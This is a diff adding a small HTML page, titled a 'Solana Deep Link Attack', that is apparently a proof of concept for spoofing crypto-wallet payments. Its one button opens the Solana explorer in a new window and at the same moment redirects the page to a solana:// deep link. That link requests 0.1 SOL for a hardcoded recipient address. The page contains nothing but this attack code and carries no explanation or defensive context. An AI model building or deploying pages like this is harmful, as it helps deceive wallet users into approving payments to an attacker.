@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Solana Deep Link Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <h2>Solana Deep Link Attack</h2>
+
+  <button onclick="launchSpoof()">fake transaction</button>
+
+  <script>
+    function launchSpoof() {
+       setTimeout(async () => {
+      window.open("https://explorer.solana.com/")
+
+        }, 100);
+  
+      const recipient = 'Di4vBZWn8nj1zVJ5oQzHtrRgUPGtWa15hgXwZkF71WH6';  // Dummy Solana address
+      const amount = '0.1';  // Fake amount in SOL (e.g., 0.1 SOL)
+
+      const deepLink = `solana://${recipient}?amount=${amount}`;
+      window.location.href = deepLink;
+    }
+  </script>
+</body>
+</html>
